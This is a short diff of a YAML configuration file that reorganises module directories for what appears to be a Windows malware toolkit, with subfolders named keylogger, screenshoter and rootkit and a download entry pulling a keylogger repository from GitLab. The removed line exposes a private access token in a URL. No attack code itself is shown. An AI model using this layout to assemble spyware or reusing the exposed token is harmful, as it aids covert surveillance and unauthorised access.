@@ -9,21 +9,20 @@ module_directories:
 
 # Module Subirectories
 module_directories_subfolders:
-  - anagenesis
-  - aytogenesis
-  - paragenesis
-  - anagenesis/anacrypsis
-  - anagenesis/katascopos
-  - anagenesis/ypnokratos
-  - anagenesis/katascopos/user_based
-  - anagenesis/ypnokratos/deep_abyss
-  - anagenesis/katascopos/user_based/keylogger
-  - anagenesis/katascopos/user_based/screenshoter
-  - anagenesis/ypnokratos/deep_abyss/rootkit
+  - windows
+  - windows/anagenesis
+  - windows/aytogenesis
+  - windows/paragenesis
+  - windows/anagenesis/anacrypsis
+  - windows/anagenesis/katascopos
+  - windows/anagenesis/ypnokratos
+  - windows/anagenesis/katascopos/keylogger
+  - windows/anagenesis/katascopos/screenshoter
+  - windows/anagenesis/ypnokratos/rootkit
 
 # Download repositories
 download_repositories:
   - name: windows_api
-    path: anagenesis/katascopos/user_based/keylogger
-    url: https://gitlab.com/PhantomGhosts/BigBrother/repository/archive.tar.gz?ref=master&private_token=ssBUkmzzuQ8x-cqQUd7P
+    path: windows/anagenesis/katascopos/keylogger
+    url: https://gitlab.com/PhantomGhosts/Windows_api-Keylogger/repository/archive.tar.gz?ref=master
 ...
